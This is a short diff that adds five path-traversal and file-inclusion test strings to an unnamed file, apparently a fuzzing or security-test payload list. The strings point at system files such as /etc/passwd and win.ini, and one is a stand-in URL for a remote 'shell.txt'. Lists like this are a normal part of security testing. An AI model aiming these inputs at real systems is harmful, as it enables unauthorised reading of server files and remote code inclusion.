@@ -1,0 +1,5 @@
+/etc/passwd
+../../../etc/passwd
+file:///etc/passwd
+C:\Windows\win.ini
+http://example.com/shell.txt
